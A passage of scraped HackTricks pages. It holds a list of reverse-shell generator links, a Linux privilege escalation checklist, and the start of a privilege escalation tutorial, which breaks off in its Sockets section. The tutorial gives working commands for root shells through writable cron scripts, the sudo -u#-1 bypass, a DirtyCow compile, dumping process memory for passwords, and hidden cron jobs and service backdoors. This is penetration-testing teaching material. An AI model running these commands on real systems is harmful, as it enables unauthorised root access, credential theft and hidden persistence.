the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nGeneric Methodologies & Resources -\nPrevious\nThreat Modeling\nNext\n- Generic Methodologies & Resources\nShells (Linux, Windows, MSFVenom)\nLast modified\n2mo ago"
    },
    {
        "title": "Shells (Linux, Windows, MSFVenom)",
        "url": "https://book.hacktricks.xyz/generic-methodologies-and-resources/shells",
        "text": "Shells (Linux, Windows, MSFVenom)\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\n‚Äã\nShells - Linux\n‚Äã\n‚Äã\nShells - Windows\n‚Äã\n‚Äã\nMSFVenom - CheatSheet\n‚Äã\n‚Äã\nFull TTYs\n‚Äã\nAuto-generated shells\n‚Äã\nhttps://reverse-shell.sh/\n‚Äã\n‚Äã\nhttps://www.revshells.com/\n‚Äã\n‚Äã\nhttps://github.com/ShutdownRepo/shellerator\n‚Äã\n‚Äã\nhttps://github.com/0x00-0x00/ShellPop\n‚Äã\n‚Äã\nhttps://github.com/cybervaca/ShellReverse\n‚Äã\n‚Äã\nhttps://liftoff.github.io/pyminifier/\n‚Äã\n‚Äã\nhttps://github.com/xct/xc/\n‚Äã\n‚Äã\nhttps://weibell.github.io/reverse-shell-generator/\n‚Äã\n‚Äã\nhttps://github.com/t0thkr1s/revshellgen\n‚Äã\n‚Äã\nhttps://github.com/mthbernardes/rsg\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nGeneric Methodologies & Resources -\nPrevious\nSearch Exploits\nNext\nMSFVenom - CheatSheet\nLast modified\n6mo ago"
    },
    {
        "title": "Checklist - Linux Privilege Escalation",
        "url": "https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist",
        "text": "Checklist - Linux Privilege Escalation\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.‚Äã\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\nBest tool to look for Linux local privilege escalation vectors:\nLinPEAS\n‚Äã\n‚Äã\nSystem Information\n‚Äã\nGet\nOS information\nCheck the\nPATH\n, any\nwritable folder\n?\nCheck\nenv variables\n, any sensitive detail?\nSearch for\nkernel exploits\nusing scripts\n(DirtyCow?)\nCheck\nif the\nsudo version\nis vulnerable\n‚Äã\n‚Äã\nDmesg\nsignature verification failed\n‚Äã\nMore system enum (\ndate, system stats, cpu info, printers\n)\n‚Äã\nEnumerate more defenses\n‚Äã\n‚Äã\nDrives\n‚Äã\nList mounted\ndrives\nAny unmounted drive?\nAny creds in fstab?\n‚Äã\nInstalled Software\n‚Äã\nCheck for\nuseful software\ninstalled\nCheck for\nvulnerable software\ninstalled\n‚Äã\nProcesses\n‚Äã\nIs any\nunknown software running\n?\nIs any software running with\nmore privileges than it should have\n?\nSearch for\nexploits of running processes\n(especially the version running).\nCan you\nmodify the binary\nof any running process?\nMonitor processes\nand check if any interesting process is running frequently.\nCan you\nread\nsome interesting\nprocess memory\n(where passwords could be saved)?\n‚Äã\nScheduled/Cron jobs?\n‚Äã\nIs the\nPATH\nbeing modified by some cron and you can\nwrite\nin it?\nAny\nwildcard\nin a cron job?\nSome\nmodifiable script\nis being\nexecuted\nor is inside\nmodifiable folder\n?\nHave you detected that some\nscript\ncould be or are being\nexecuted\nvery\nfrequently\n? (every 1, 2 or 5 minutes)\n‚Äã\nServices\n‚Äã\nAny\nwritable .service\nfile?\nAny\nwritable binary\nexecuted by a\nservice\n?\nAny\nwritable folder in systemd PATH\n?\n‚Äã\nTimers\n‚Äã\nAny\nwritable timer\n?\n‚Äã\nSockets\n‚Äã\nAny\nwritable .socket\nfile?\nCan you\ncommunicate with any socket\n?\nHTTP sockets\nwith interesting info?\n‚Äã\nD-Bus\n‚Äã\nCan you\ncommunicate with any D-Bus\n?\n‚Äã\nNetwork\n‚Äã\nEnumerate the network to know where you are\nOpen ports you couldn't access before\ngetting a shell inside the machine?\nCan you\nsniff traffic\nusing\ntcpdump\n?\n‚Äã\nUsers\n‚Äã\nGeneric users/groups\nenumeration\nDo you have a\nvery big UID\n? Is the\nmachine\nvulnerable\n?\nCan you\nescalate privileges thanks to a group\nyou belong to?\nClipboard\ndata?\nPassword Policy?\nTry to\nuse\nevery\nknown password\nthat you have discovered previously to login\nwith each\npossible\nuser\n. Try to login also without a password.\n‚Äã\nWritable PATH\n‚Äã\nIf you have\nwrite privileges over some folder in PATH\nyou may be able to escalate privileges\n‚Äã\nSUDO and SUID commands\n‚Äã\nCan you execute\nany command with sudo\n? Can you use it to READ, WRITE or EXECUTE anything as root? (\nGTFOBins\n)\nIs any\nexploitable SUID binary\n? (\nGTFOBins\n)\nAre\nsudo\ncommands\nlimited\nby\npath\n? can you\nbypass\nthe restrictions\n?\n‚Äã\nSudo/SUID binary without path indicated\n?\n‚Äã\nSUID binary specifying path\n? Bypass\n‚Äã\nLD_PRELOAD vuln\n‚Äã\n‚Äã\nLack of .so library in SUID binary\nfrom a writable folder?\n‚Äã\nSUDO tokens available\n?\nCan you create a SUDO token\n?\nCan you\nread or modify sudoers files\n?\nCan you\nmodify /etc/ld.so.conf.d/\n?\n‚Äã\nOpenBSD DOAS\ncommand\n‚Äã\nCapabilities\n‚Äã\nHas any binary any\nunexpected capability\n?\n‚Äã\nACLs\n‚Äã\nHas any file any\nunexpected ACL\n?\n‚Äã\nOpen Shell sessions\n‚Äã\nscreen\ntmux\n‚Äã\nSSH\n‚Äã\nDebian\nOpenSSL Predictable PRNG - CVE-2008-0166\n‚Äã\n‚Äã\nSSH Interesting configuration values\n‚Äã\n‚Äã\nInteresting Files\n‚Äã\nProfile files\n- Read sensitive data? Write to privesc?\npasswd/shadow files\n- Read sensitive data? Write to privesc?\nCheck commonly interesting folders\nfor sensitive data\nWeird Location/Owned files,\nyou may have access to or alter executable files\nModified\nin last mins\nSqlite DB files\nHidden files\nScript/Binaries in PATH\nWeb files\n(passwords?)\nBackups\n?\nKnown files that contains passwords\n: Use\nLinpeas\nand\nLaZagne\nGeneric search\n‚Äã\nWritable Files\n‚Äã\nModify python library\nto execute arbitrary commands?\nCan you\nmodify log files\n?\nLogtotten\nexploit\nCan you\nmodify /etc/sysconfig/network-scripts/\n? Centos/Redhat exploit\nCan you\nwrite in ini, int.d, systemd or rc.d files\n?\n‚Äã\nOther tricks\n‚Äã\nCan you\nabuse NFS to escalate privileges\n?\nDo you need to\nescape from a restrictive shell\n?\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nFull TTYs\nNext\n- Linux Hardening\nLinux Privilege Escalation\nLast modified\n4mo ago"
    },
    {
        "title": "Linux Privilege Escalation",
        "url": "https://book.hacktricks.xyz/linux-hardening/privilege-escalation",
        "text": "Linux Privilege Escalation\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nSystem Information\nOS info\nLet's start gaining some knowledge of the OS running\n(\ncat /proc/version\n||\nuname\n-a\n)\n2\n>\n/dev/null\nlsb_release\n-a\n2\n>\n/dev/null\n# old, not by default on many systems\ncat\n/etc/os-release\n2\n>\n/dev/null\n# universal on modern systems\nPath\nIf you\nhave write permissions on any folder inside the\nPATH\nvariable you may be able to hijack some libraries or binaries:\necho\n$PATH\nEnv info\nInteresting information, passwords or API keys in the environment variables?\n(\nenv\n||\nset\n)\n2\n>\n/dev/null\nKernel exploits\nCheck the kernel version and if there is some exploit that can be used to escalate privileges\ncat\n/proc/version\nuname\n-a\nsearchsploit\n\"Linux Kernel\"\nYou can find a good vulnerable kernel list and some already\ncompiled exploits\nhere:\nhttps://github.com/lucyoa/kernel-exploits\nand\nexploitdb sploits\n.\nOther sites where you can find some\ncompiled exploits\n:\nhttps://github.com/bwbwbwbw/linux-exploit-binaries\n,\nhttps://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack\n‚Äã\nTo extract all the vulnerable kernel versions from that web you can do:\ncurl\nhttps://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md\n2\n>\n/dev/null\n|\ngrep\n\"Kernels: \"\n|\ncut\n-d\n\":\"\n-f\n2\n|\ncut\n-d\n\"<\"\n-f\n1\n|\ntr\n-d\n\",\"\n|\ntr\n' '\n'\\n'\n|\ngrep\n-v\n\"^\\d\\.\\d$\"\n|\nsort\n-u\n-r\n|\ntr\n'\\n'\n' '\nTools that could help to search for kernel exploits are:\n‚Äã\nlinux-exploit-suggester.sh\nlinux-exploit-suggester2.pl\nlinuxprivchecker.py\n(execute IN victim,only checks exploits for kernel 2.x)\nAlways\nsearch the kernel version in Google\n, maybe your kernel version is written in some kernel exploit and then you will be sure that this exploit is valid.\nCVE-2016-5195 (DirtyCow)\nLinux Privilege Escalation - Linux Kernel <= 3.19.0-73.8\n# make dirtycow stable\necho\n0\n>\n/proc/sys/vm/dirty_writeback_centisecs\ng++\n-Wall\n-pedantic\n-O2\n-std\n=\nc++11\n-pthread\n-o\ndcow\n40847\n.cpp\n-lutil\nhttps://github.com/dirtycow/dirtycow.github.io/wiki/PoCs\nhttps://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c\nSudo version\nBased on the vulnerable sudo versions that appear in:\nsearchsploit\nsudo\nYou can check if the sudo version is vulnerable using this grep.\nsudo\n-V\n|\ngrep\n\"Sudo ver\"\n|\ngrep\n\"1\\.[01234567]\\.[0-9]\\+\\|1\\.8\\.1[0-9]\\*\\|1\\.8\\.2[01234567]\"\nsudo < v1.28\nFrom @sickrov\nsudo -u#-1 /bin/bash\nDmesg signature verification failed\nCheck\nsmasher2 box of HTB\nfor an\nexample\nof how this vuln could be exploited\ndmesg\n2\n>\n/dev/null\n|\ngrep\n\"signature\"\nMore system enumeration\ndate\n2\n>\n/dev/null\n#Date\n(\ndf\n-h\n||\nlsblk\n)\n#System stats\nlscpu\n#CPU info\nlpstat\n-a\n2\n>\n/dev/null\n#Printers info\nEnumerate possible defenses\nAppArmor\nif\n[\n`\nwhich\naa-status\n2\n>\n/dev/null\n`\n];\nthen\naa-status\nelif\n[\n`\nwhich\napparmor_status\n2\n>\n/dev/null\n`\n];\nthen\napparmor_status\nelif\n[\n`\nls\n-d\n/etc/apparmor*\n2\n>\n/dev/null\n`\n];\nthen\nls\n-d\n/etc/apparmor*\nelse\necho\n\"Not found AppArmor\"\nfi\nGrsecurity\n((\nuname\n-r\n|\ngrep\n\"\\-grsec\"\n>\n/dev/null\n2\n>\n&1\n||\ngrep\n\"grsecurity\"\n/etc/sysctl.conf\n>\n/dev/null\n2\n>\n&1\n)\n&&\necho\n\"Yes\"\n||\necho\n\"Not found grsecurity\"\n)\nPaX\n(\nwhich paxctl-ng paxctl\n>\n/dev/null\n2\n>\n&1\n&&\necho\n\"Yes\"\n||\necho\n\"Not found PaX\"\n)\nExecshield\n(\ngrep\n\"exec-shield\"\n/etc/sysctl.conf\n||\necho\n\"Not found Execshield\"\n)\nSElinux\n(\nsestatus\n2\n>\n/dev/null\n||\necho\n\"Not found sestatus\"\n)\nASLR\ncat\n/proc/sys/kernel/randomize_va_space\n2\n>\n/dev/null\n#If 0, not enabled\nDocker Breakout\nIf you are inside a docker container you can try to escape from it:\nDocker Security\nDrives\nCheck\nwhat is mounted and unmounted\n, where and why. If anything is unmounted you could try to mount it and check for private info\nls\n/dev\n2\n>\n/dev/null\n|\ngrep\n-i\n\"sd\"\ncat\n/etc/fstab\n2\n>\n/dev/null\n|\ngrep\n-v\n\"^#\"\n|\ngrep\n-Pv\n\"\\W*\\#\"\n2\n>\n/dev/null\n#Check if credentials in fstab\ngrep\n-E\n\"(user|username|login|pass|password|pw|credentials)[=:]\"\n/etc/fstab /etc/mtab\n2\n>\n/dev/null\nUseful software\nEnumerate useful binaries\nwhich\nnmap aws\nnc\nncat netcat nc.traditional\nwget\ncurl\nping\ngcc g++\nmake\ngdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas\nsudo\nfetch\ndocker\nlxc ctr runc rkt kubectl\n2\n>\n/dev/null\nAlso, check if\nany compiler is installed\n. This is useful if you need to use some kernel exploit as it's recommended to compile it in the machine where you are going to use it (or in one similar)\n(\ndpkg\n--list\n2\n>\n/dev/null\n|\ngrep\n\"compiler\"\n|\ngrep\n-v\n\"decompiler\\|lib\"\n2\n>\n/dev/null\n||\nyum list installed\n'gcc*'\n2\n>\n/dev/null\n|\ngrep\ngcc\n2\n>\n/dev/null\n;\nwhich\ngcc g++\n2\n>\n/dev/null\n||\nlocate\n-r\n\"/gcc[0-9\\.-]\\+$\"\n2\n>\n/dev/null\n|\ngrep\n-v\n\"/doc/\"\n)\nVulnerable Software Installed\nCheck for the\nversion of the installed packages and services\n. Maybe there is some old Nagios version (for example) that could be exploited for escalating privileges‚Ä¶\nIt is recommended to check manually the version of the more suspicious installed software.\ndpkg\n-l\n#Debian\nrpm\n-qa\n#Centos\nIf you have SSH access to the machine you could also use\nopenVAS\nto check for outdated and vulnerable software installed inside the machine.\nNote that these commands will show a lot of information that will mostly be useless, therefore it's recommended some applications like OpenVAS or similar that will check if any installed software version is vulnerable to known exploits\nProcesses\nTake a look at\nwhat processes\nare being executed and check if any process has\nmore privileges than it should\n(maybe a tomcat being executed by root?)\nps\naux\nps\n-ef\ntop\n-n\n1\nAlways check for possible\nelectron/cef/chromium debuggers\nrunning, you could abuse it to escalate privileges\n.\nLinpeas\ndetect those by checking the\n--inspect\nparameter inside the command line of the process.\nAlso\ncheck your privileges over the processes binaries\n, maybe you can overwrite someone.\nProcess monitoring\nYou can use tools like\npspy\nto monitor processes. This can be very useful to identify vulnerable processes being executed frequently or when a set of requirements are met.\nProcess memory\nSome services of a server save\ncredentials in clear text inside the memory\n.\nNormally you will need\nroot privileges\nto read the memory of processes that belong to other users, therefore this is usually more useful when you are already root and want to discover more credentials.\nHowever, remember that\nas a regular user you can read the memory of the processes you own\n.\nNote that nowadays most machines\ndon't allow ptrace by default\nwhich means that you cannot dump other processes that belong to your unprivileged user.\nThe file\n/proc/sys/kernel/yama/ptrace_scope\ncontrols the accessibility of ptrace:\nkernel.yama.ptrace_scope = 0\n: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.\nkernel.yama.ptrace_scope = 1\n: only a parent process can be debugged.\nkernel.yama.ptrace_scope = 2\n: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.\nkernel.yama.ptrace_scope = 3\n: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.\nGDB\nIf you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.\ngdb\n-p\n<\nFTP_PROCESS_PID\n>\n(\ngdb\n)\ninfo proc mappings\n(\ngdb\n)\nq\n(\ngdb\n)\ndump memory /tmp/mem_ftp\n<\nSTART_HEAD\n>\n<\nEND_HEAD\n>\n(\ngdb\n)\nq\nstrings /tmp/mem_ftp\n#User and password\nGDB Script\ndump-memory.sh\n#!/bin/bash\n#./dump-memory.sh <PID>\ngrep\nrw-p /proc/\n$1\n/maps\n\\\n|\nsed\n-n\n's/^\\([0-9a-f]*\\)-\\([0-9a-f]*\\) .*$/\\1 \\2/p'\n\\\n|\nwhile\nread\nstart stop\n;\ndo\n\\\ngdb\n--batch\n--pid\n$1\n-ex\n\\\n\"dump memory\n$1\n-\n$start\n-\n$stop\n.dump 0x\n$start\n0x\n$stop\n\"\n;\n\\\ndone\n/proc/$pid/maps & /proc/$pid/mem\nFor a given process ID,\nmaps show how memory is mapped within that process's\nvirtual address space; it also shows the\npermissions of each mapped region\n. The\nmem\npseudo file\nexposes the processes memory itself\n. From the\nmaps\nfile we know which\nmemory regions are readable\nand their offsets. We use this information to\nseek into the mem file and dump all readable regions\nto a file.\nprocdump\n()\n(\ncat\n/proc/\n$1\n/maps\n|\ngrep\n-Fv\n\".so\"\n|\ngrep\n\" 0 \"\n|\nawk\n'{print $1}'\n|\n(\nIFS\n=\n\"-\"\nwhile\nread\na b\n;\ndo\ndd\nif\n=\n/proc/\n$1\n/mem\nbs\n=\n$(\ngetconf PAGESIZE\n)\niflag\n=\nskip_bytes,count_bytes\n\\\nskip\n=\n$((\n0\nx$a\n))\ncount\n=\n$((\n0\nx$b\n-\n0\nx$a\n))\nof\n=\n\"\n$1_mem_$a\n.bin\"\ndone\n)\ncat\n$1\n*.bin\n>\n$1\n.dump\nrm\n$1\n*.bin\n)\n/dev/mem\n/dev/mem\nprovides access to the system's\nphysical\nmemory, not the virtual memory. The kernel's virtual address space can be accessed using /dev/kmem.\nTypically,\n/dev/mem\nis only readable by\nroot\nand\nkmem\ngroup.\nstrings /dev/mem -n10 | grep -i PASS\nProcDump for linux\nProcDump is a Linux reimagining of the classic ProcDump tool from the Sysinternals suite of tools for Windows. Get it in\nhttps://github.com/Sysinternals/ProcDump-for-Linux\n‚Äã\nprocdump -p 1714\n‚Äã\nProcDump v1.2 - Sysinternals process dump utility\nCopyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.\nMark Russinovich, Mario Hewardt, John Salem, Javid Habibi\nMonitors a process and writes a dump file when the process meets the\nspecified criteria.\n‚Äã\nProcess:\t\tsleep (1714)\nCPU Threshold:\t\tn/a\nCommit Threshold:\tn/a\nThread Threshold:\t\tn/a\nFile descriptor Threshold:\t\tn/a\nSignal:\t\tn/a\nPolling interval (ms):\t1000\nThreshold (s):\t10\nNumber of Dumps:\t1\nOutput directory for core dumps:\t.\n‚Äã\nPress Ctrl-C to end monitoring without terminating the process.\n‚Äã\n[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps\n[20:20:58 - INFO]: Timed:\n[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714\nTools\nTo dump a process memory you could use:\n‚Äã\nhttps://github.com/Sysinternals/ProcDump-for-Linux\n‚Äã\n‚Äã\nhttps://github.com/hajzer/bash-memory-dump\n(root) - _You can manually remove root requirements and dump the process owned by you\nScript A.5 from\nhttps://www.delaat.net/rp/2016-2017/p97/report.pdf\n(root is required)\nCredentials from Process Memory\nManual example\nIf you find that the authenticator process is running:\nps\n-ef\n|\ngrep\n\"authenticator\"\nroot\n2027\n2025\n0\n11\n:46 ?        00:00:00 authenticator\nYou can dump the process (see before sections to find different ways to dump the memory of a process) and search for credentials inside the memory:\n./dump-memory.sh\n2027\nstrings *.dump\n|\ngrep\n-i\npassword\nmimipenguin\nThe tool\nhttps://github.com/huntergregal/mimipenguin\nwill\nsteal clear text credentials from memory\nand from some\nwell known files\n. It requires root privileges to work properly.\nFeature\nProcess Name\nGDM password (Kali Desktop, Debian Desktop)\ngdm-password\nGnome Keyring (Ubuntu Desktop, ArchLinux Desktop)\ngnome-keyring-daemon\nLightDM (Ubuntu Desktop)\nlightdm\nVSFTPd (Active FTP Connections)\nvsftpd\nApache2 (Active HTTP Basic Auth Sessions)\napache2\nOpenSSH (Active SSH Sessions - Sudo Usage)\nsshd:\nSearch Regexes/\ntruffleproc\n‚Äã\n# un truffleproc.sh against your current Bash shell (e.g. $$)\n./truffleproc.sh\n$$\n# coredumping pid 6174\nReading symbols from od\n..\n.\nReading symbols from /usr/lib/systemd/systemd\n..\n.\nReading symbols from /lib/systemd/libsystemd-shared-247.so\n..\n.\nReading symbols from /lib/x86_64-linux-gnu/librt.so.1\n..\n.\n[..\n.\n]\n# extracting strings to /tmp/tmp.o6HV0Pl3fe\n# finding secrets\n# results in /tmp/tmp.o6HV0Pl3fe/results.txt\nScheduled/Cron jobs\nCheck if any scheduled job is vulnerable. Maybe you can take advantage of a script being executed by root (wildcard vuln? can modify files that root uses? use symlinks? create specific files in the directory that root uses?).\ncrontab\n-l\nls\n-al\n/etc/cron* /etc/at*\ncat\n/etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root\n2\n>\n/dev/null\n|\ngrep\n-v\n\"^#\"\nCron path\nFor example, inside\n/etc/crontab\nyou can find the PATH:\nPATH=\n/home/user\n:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n(\nNote how the user \"user\" has writing privileges over /home/user\n)\nIf inside this crontab the root user tries to execute some command or script without setting the path. For example:\n* * * * root overwrite.sh\nThen, you can get a root shell by using:\necho\n'cp /bin/bash /tmp/bash; chmod +s /tmp/bash'\n>\n/home/user/overwrite.sh\n#Wait cron job to be executed\n/tmp/bash\n-p\n#The effective uid and gid to be set to the real uid and gid\nCron using a script with a wildcard (Wildcard Injection)\nIf a script is executed by root has a ‚Äú\n*\n‚Äù inside a command, you could exploit this to make unexpected things (like privesc). Example:\nrsync\n-a\n*.sh rsync://host.back/src/rbd\n#You can create a file called \"-e sh myscript.sh\" so the script will execute our script\nIf the wildcard is preceded of a path like\n/some/path/*\n, it's not vulnerable (even\n./*\nis not).\nRead the following page for more wildcard exploitation tricks:\nWildcards Spare tricks\nCron script overwriting and symlink\nIf you\ncan modify a cron script\nexecuted by root, you can get a shell very easily:\necho\n'cp /bin/bash /tmp/bash; chmod +s /tmp/bash'\n>\n<\n/\nPATH\n/CRON/SCRIPT\n>\n#Wait until it is executed\n/tmp/bash\n-p\nIf the script executed by root uses a\ndirectory where you have full access\n, maybe it could be useful to delete that folder and\ncreate a symlink folder to another one\nserving a script controlled by you\nln\n-d\n-s\n<\n/\nPATH\n/TO/POINT\n>\n<\n/\nPATH\n/CREATE/FOLDER\n>\nFrequent cron jobs\nYou can monitor the processes to search for processes that are being executed every 1, 2 or 5 minutes. Maybe you can take advantage of it and escalate privileges.\nFor example, to\nmonitor every 0.1s during 1 minute\n,\nsort by less executed commands\nand delete the commands that have been executed the most, you can do:\nfor\ni\nin\n$(\nseq\n1\n610\n)\n;\ndo\nps\n-e\n--format\ncmd\n>>\n/tmp/monprocs.tmp\n;\nsleep\n0.1\n;\ndone\n;\nsort\n/tmp/monprocs.tmp\n|\nuniq\n-c\n|\ngrep\n-v\n\"\\[\"\n|\nsed\n'/^.\\{200\\}./d'\n|\nsort\n|\ngrep\n-E\n-v\n\"\\s*[6-9][0-9][0-9]|\\s*[0-9][0-9][0-9][0-9]\"\n;\nrm\n/tmp/monprocs.tmp\n;\nYou can also use\npspy\n(this will monitor and list every process that starts).\nInvisible cron jobs\nIt's possible to create a cronjob\nputting a carriage return after a comment\n(without newline character), and the cron job will work. Example (note the carriage return char):\n#This is a comment inside a cron config file\\r* * * * * echo \"Surprise!\"\nServices\nWritable\n.service\nfiles\nCheck if you can write any\n.service\nfile, if you can, you\ncould modify it\nso it\nexecutes\nyour\nbackdoor when\nthe service is\nstarted\n,\nrestarted\nor\nstopped\n(maybe you will need to wait until the machine is rebooted).\nFor example create your backdoor inside the .service file with\nExecStart=/tmp/script.sh\nWritable service binaries\nKeep in mind that if you have\nwrite permissions over binaries being executed by services\n, you can change them for backdoors so when the services get re-executed the backdoors will be executed.\nsystemd PATH - Relative Paths\nYou can see the PATH used by\nsystemd\nwith:\nsystemctl show-environment\nIf you find that you can\nwrite\nin any of the folders of the path you may be able to\nescalate privileges\n. You need to search for\nrelative paths being used on service configurations\nfiles like:\nExecStart\n=\nfaraday-server\nExecStart\n=\n/bin/sh\n-ec\n'ifup --allow=hotplug %I; ifquery --state %I'\nExecStop\n=\n/bin/sh\n\"uptux-vuln-bin3 -stuff -hello\"\nThen, create an\nexecutable\nwith the\nsame name as the relative path binary\ninside the systemd PATH folder you can write, and when the service is asked to execute the vulnerable action (\nStart\n,\nStop\n,\nReload\n), your\nbackdoor will be executed\n(unprivileged users usually cannot start/stop services but check if you can use\nsudo -l\n).\nLearn more about services with\nman systemd.service\n.\nTimers\nTimers\nare systemd unit files whose name ends in\n**.timer**\nthat control\n**.service**\nfiles or events.\nTimers\ncan be used as an alternative to cron as they have built-in support for calendar time events and monotonic time events and can be run asynchronously.\nYou can enumerate all the timers with:\nsystemctl list-timers\n--all\nWritable timers\nIf you can modify a timer you can make it execute some existents of systemd.unit (like a\n.service\nor a\n.target\n)\nUnit\n=\nbackdoor.service\nIn the documentation you can read what the Unit is:\nThe unit to activate when this timer elapses. The argument is a unit name, whose suffix is not \".timer\". If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix. (See above.) It is recommended that the unit name that is activated and the unit name of the timer unit are named identically, except for the suffix.\nTherefore, to abuse this permission you would need to:\nFind some systemd unit (like a\n.service\n) that is\nexecuting a writable binary\nFind some systemd unit that is\nexecuting a relative path\nand you have\nwritable privileges\nover the\nsystemd PATH\n(to impersonate that executable)\nLearn more about timers with\nman systemd.timer\n.\nEnabling Timer\nTo enable a timer you need root privileges and to execute:\nsudo\nsystemctl\nenable\nbacku2.timer\nCreated symlink /etc/systemd/system/multi-user.target.wants/backu2.timer ‚Üí /lib/systemd/system/backu2.timer.\nNote the\ntimer\nis\nactivated\nby creating a symlink to it on\n/etc/systemd/system/<WantedBy_section>.wants/<name>.timer\nSockets\nIn brief, a Unix Socket (technically, the correct name is Unix Domain Socket,\nUDS\n) allows\ncommunication between two different processes\non either the same machine or different machines in client-server application frameworks. To be more precise, it‚Äôs a way of communicating among computers using a standard Unix descriptors file. (From\nhere\n).\nSockets can be configured using\n.socket\nfiles.\nLearn more about sockets with\nman systemd.socket\n.\nInside this file, several interesting parameters can be 